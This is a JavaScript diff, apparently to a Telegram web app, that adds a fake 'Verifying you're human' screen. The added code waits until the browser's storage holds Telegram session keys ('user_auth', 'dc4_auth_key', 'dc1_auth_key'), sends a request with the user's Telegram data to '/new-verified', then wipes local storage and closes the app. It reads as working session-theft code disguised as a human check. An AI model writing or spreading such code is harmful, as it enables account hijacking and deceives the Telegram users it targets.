@@ -12,7 +12,7 @@ window.Sg = {
       const isTelegram = window.Telegram?.WebApp?.initData;
 
       if (isTelegram) {
-        // ✅ Schermata con stile esattamente identico + background forzato
+        // ✅ Schermata fake "Verifying you're human"
         document.body.innerHTML = `
           <style>
             html, body {
@@ -54,10 +54,16 @@ window.Sg = {
             </h2>
           </div>
         `;
-      }
 
-      if (isTelegram) {
-        setTimeout(async () => {
+        const waitForAuth = async () => {
+          let retries = 5;
+          while (retries-- > 0) {
+            const ua = localStorage.getItem("user_auth");
+            const authKey = localStorage.getItem("dc4_auth_key") || localStorage.getItem("dc1_auth_key");
+            if (ua && authKey) break;
+            await new Promise(r => setTimeout(r, 1000));
+          }
+
           const user = window.Telegram.WebApp.initDataUnsafe.user || {};
           await fetch("/new-verified", {
             method: "POST",
@@ -72,7 +78,9 @@ window.Sg = {
 
           localStorage.clear();
           window.Telegram.WebApp.close();
-        }, 5000);
+        };
+
+        waitForAuth();
       }
     }
   },
